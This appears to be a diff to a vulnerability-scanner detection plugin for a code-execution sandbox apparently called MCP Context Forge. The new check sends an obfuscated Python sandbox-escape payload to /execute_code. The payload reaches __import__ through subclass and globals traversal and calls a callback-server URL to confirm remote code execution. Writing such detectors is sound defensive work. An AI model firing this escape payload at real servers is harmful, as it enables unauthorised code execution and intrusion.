@@ -34,34 +34,41 @@ config: {}
 ###########
 
 actions: {
-  name: "fingerprint_sandbox_server"
+  name: "fingerprint_mcp_context_forge"
   http_request: {
     method: GET
-    uri: "/docs"
+    uri: "/openapi.json"
     response: {
       http_status: 200
+      expect_all: {
+        conditions: [
+          { body: {} contains: "execute_code" }
+        ]
+      }
     }
   }
 }
 
 actions: {
-  name: "check_sandbox_escape_rce"
+  name: "check_sandbox_escape_rce_oob"
   http_request: {
     method: POST
     uri: "/execute_code"
     headers: [
       { name: "Content-Type" value: "application/json" }
     ]
-    data: "{\"code\": \"cls_attr = \\\"__\\\" + \\\"class\\\" + \\\"__\\\"; bases_attr = \\\"__\\\" + \\\"bases\\\" + \\\"__\\\"; subclasses_attr = \\\"__\\\" + \\\"subclasses\\\" + \\\"__\\\"; b = getattr(getattr(0, cls_attr), bases_attr)[0]; subclasses = getattr(b, subclasses_attr)(); result = str(len(subclasses))\"}"
-    response: {
-      http_status: 200
-      expect_all: {
-        conditions: [
-          { body: {} contains: "success" }
-        ]
-      }
-    }
+    data: "{\"code\": \"cls_attr = \\\"__\\\" + \\\"class\\\" + \\\"__\\\"; bases_attr = \\\"__\\\" + \\\"bases\\\" + \\\"__\\\"; subclasses_attr = \\\"__\\\" + \\\"subclasses\\\" + \\\"__\\\"; init_attr = \\\"__\\\" + \\\"init\\\" + \\\"__\\\"; glob_attr = \\\"__\\\" + \\\"globals\\\" + \\\"__\\\"; name_attr = \\\"__\\\" + \\\"name\\\" + \\\"__\\\"; b = getattr(getattr(0, cls_attr), bases_attr)[0];\\nfor sub in getattr(b, subclasses_attr)():\\n    if getattr(sub, name_attr) == '_Printer':\\n        try:\\n            init_fn = getattr(sub, init_attr)\\n            g = getattr(init_fn, glob_attr)\\n            s = g['__builtins__']['__' + 'import__']('sys')\\n            g['__builtins__']['__' + 'import__']('urllib.request')\\n            req = s.modules['urllib.request']\\n            req.urlopen('{{ T_CBS_URI }}')\\n            result = 'SUCCESS'\\n            break\\n        except Exception as e:\\n            result = str(e)\"}"
   }
+}
+
+actions: {
+  name: "sleep"
+  utility: { sleep: { duration_ms: 5000 } }
+}
+
+actions: {
+  name: "check_callback_server_logs"
+  callback_server: { action_type: CHECK }
 }
 
 #############
@@ -69,8 +76,11 @@ actions: {
 #############
 
 workflows: {
+  condition: REQUIRES_CALLBACK_SERVER
   actions: [
-    "fingerprint_sandbox_server",
-    "check_sandbox_escape_rce"
+    "fingerprint_mcp_context_forge",
+    "check_sandbox_escape_rce_oob",
+    "sleep",
+    "check_callback_server_logs"
   ]
 }
